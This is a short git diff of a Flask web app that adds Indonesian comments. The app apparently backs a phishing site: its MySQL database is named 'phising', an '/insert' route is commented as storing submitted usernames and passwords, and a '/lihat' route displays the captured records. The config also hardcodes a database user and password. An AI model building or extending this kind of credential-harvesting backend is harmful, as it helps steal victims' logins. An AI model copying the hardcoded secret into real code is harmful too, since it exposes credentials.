@@ -3,6 +3,7 @@ from flask_mysqldb import MySQL
 
 app = Flask(__name__)
 
+# mysql setup
 app.config['MYSQL_HOST'] = 'localhost'
 app.config['MYSQL_USER'] = 'farhan'
 app.config['MYSQL_PASSWORD'] = 'CintaSejati22'
@@ -10,6 +11,7 @@ app.config['MYSQL_DB'] = 'phising'
 
 mysql = MySQL(app)
 
+# halaman index
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -21,6 +23,7 @@ def bahaya():
         return redirect(url_for('index'))
     return render_template('bahaya.html')
 
+# halaman untuk melihat database
 @app.route('/lihat')
 def lihat():
     cur = mysql.connection.cursor()
@@ -28,6 +31,7 @@ def lihat():
     data = cur.fetchall()
     return render_template('lihat.html', user = data)
 
+# method untuk memasukan data username dan password ke database mysql
 @app.route('/insert', methods=['POST'])
 def insert():
     if request.method == 'POST':
